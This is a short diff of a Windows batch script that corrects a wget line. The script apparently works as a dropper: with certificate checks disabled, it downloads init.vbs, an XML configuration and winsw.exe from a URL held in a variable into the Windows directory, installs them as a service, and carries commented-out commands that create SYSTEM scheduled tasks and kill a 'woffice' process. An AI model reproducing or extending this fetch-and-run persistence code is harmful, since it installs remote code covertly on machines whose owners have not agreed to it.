@@ -88,7 +88,7 @@ rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.
 rem schtasks /create /tn sys /xml %windir%\sys.xml /F
 rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F
 wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\init.vbs
-wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\initsw.xml
+wget --no-check-certificate %urlgit%/initsw.xml  -O %windir%\initsw.xml
 wget --no-check-certificate %urlgit%/winsw.exe  -O %windir%\initsw.exe
 initsw.exe install
 rem %windir%\init.vbs
